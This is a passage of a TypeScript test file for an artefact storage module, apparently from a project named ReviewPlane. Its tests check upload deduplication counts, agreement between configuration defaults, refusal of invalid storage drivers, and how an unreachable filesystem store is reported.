  const { projectId } = await seedProjectAndWorker(harness);
  const bytes = encodePng(64, 64);
  await upload(projectId, bytes);
  await upload(projectId, bytes);
  await upload(projectId, encodePng(65, 65));
  // A pending intent that never completes is counted separately: it is not
  // evidence, and it may never become any.
  await harness.built.app.inject({
    method: "POST",
    url: `/api/v1/projects/${projectId}/artefacts/uploads`,
    headers: WORKER,
    payload: {
      kind: "screenshot",
      content_type: "image/png",
      size_bytes: 4096,
      sha256: "f".repeat(64),
    },
  });

  const status = await harness.built.artefacts.storeStatus();
  assert.equal(status.driver, "filesystem");
  assert.equal(status.available, true);
  assert.equal(status.artefact_count, 3);
  // Two of those three share one stored object, so the total is the size of two
  // distinct objects rather than three artefacts.
  assert.equal(status.stored_bytes, bytes.byteLength + encodePng(65, 65).byteLength);
  assert.equal(status.pending_bytes, 4096);
});

test("the artefact module and the server configuration agree on their shared defaults", () => {
  // Three loaders read `REVIEWPLANE_ARTEFACT_PATH` and
  // `REVIEWPLANE_ARTEFACT_MAX_BYTES`: `src/config.ts`,
  // `src/modules/artefacts/config.ts` and `apps/mcp-server/src/config.ts`. The
  // second cannot import the first's constants without an import cycle, and the
  // third is a separate package. This asserts the two in this package agree;
  // `apps/mcp-server/test/unit.test.ts` asserts the third agrees with this one.
  // A test is the guard against them drifting; a comment would not be.
  const server = loadServerConfig(minimalServerEnvironment());
  const module = loadArtefactStoreConfig({});
  assert.equal(module.path, server.artefactPath);
  assert.equal(module.maxBytes, server.artefactMaxBytes);
  assert.equal(module.driver, "filesystem", "ADR-0012's default driver");
  assert.equal(module.path, DEFAULT_ARTEFACT_PATH);
  assert.equal(module.maxBytes, DEFAULT_ARTEFACT_MAX_BYTES);

  // The driver is the operator's only choice here, and a wrong one is refused
  // at startup rather than at the first screenshot.
  assert.throws(
    () => loadArtefactStoreConfig({ REVIEWPLANE_ARTEFACT_DRIVER: "minio" }),
    /filesystem or s3/u,
  );
  // `s3` without an endpoint is a half-configured deployment, and must not start.
  assert.throws(
    () => loadArtefactStoreConfig({ REVIEWPLANE_ARTEFACT_DRIVER: "s3" }),
    /REVIEWPLANE_S3_ENDPOINT/u,
  );
  const s3 = loadArtefactStoreConfig({
    REVIEWPLANE_ARTEFACT_DRIVER: "s3",
    REVIEWPLANE_S3_ENDPOINT: "https://s3.example.internal",
    REVIEWPLANE_S3_BUCKET: "reviewplane",
    REVIEWPLANE_S3_ACCESS_KEY: "key",
    REVIEWPLANE_S3_SECRET_KEY: "secret",
  });
  assert.equal(s3.driver, "s3");
  assert.equal(s3.s3.region, "us-east-1");
  assert.equal(s3.s3.pathStyle, true);
});

test("an unreachable store is reported as unavailable rather than as empty", async () => {
  const { rm } = await import("node:fs/promises");
  await rm(harness.artefactRoot, { recursive: true, force: true });
  const { writeFile } = await import("node:fs/promises");
  // A file where the root should be: the directory cannot be created, so the
  // probe cannot complete a round trip.
  await writeFile(harness.artefactRoot, "not a directory");
  const status = await harness.built.artefacts.storeStatus();
  assert.equal(status.available, false);
  assert.ok((status.detail ?? "").length > 0, "an unavailable store says why");
  process.stdout.write(`EVIDENCE store status: ${status.detail ?? ""}\n`);
});
